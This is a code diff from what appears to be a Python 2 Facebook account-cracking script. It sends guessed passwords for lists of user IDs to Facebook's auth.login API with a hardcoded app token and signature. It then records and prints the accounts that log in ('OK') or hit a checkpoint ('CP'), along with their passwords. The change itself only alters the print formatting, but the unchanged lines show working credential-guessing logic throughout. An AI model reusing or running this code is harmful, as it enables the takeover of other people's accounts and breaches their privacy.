@@ -216,11 +216,11 @@ def pb():
 			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			k=json.load(dt)
 			if 'www.facebook.com' in k['error_msg']:
-			    print '\x1b[1;91mCP\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + ps1+
+			    print '\x1b[1;91mCP\x1b[1;97m --' + user + '--' + ps1+
 			    cps.append(user+ps1)
 			else:
 			    if 'access_token' in k:
-			        print '\x1b[1;93mOK\x1b[1;97m-\x1b[1;93m✧\x1b[1;97m-' + user + '-\x1b[1;93m✧\x1b[1;97m-' + ps1 
+			        print '\x1b[1;93mOK\x1b[1;97m --' + user + '--' + ps1 
 			        oks.append(user+ps1)
 			    else:
 				 h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
@@ -229,7 +229,7 @@ def pb():
 			         dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			         k=json.load(dt)
 			         if 'www.facebook.com' in k['error_msg']:
-			             print '\x1b[1;91mCP\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + ps2
+			             print '\x1b[1;91mCP\x1b[1;97m --' + user + '--' + ps2
 			             cps.append(user+ps2)
 			         
 		except:
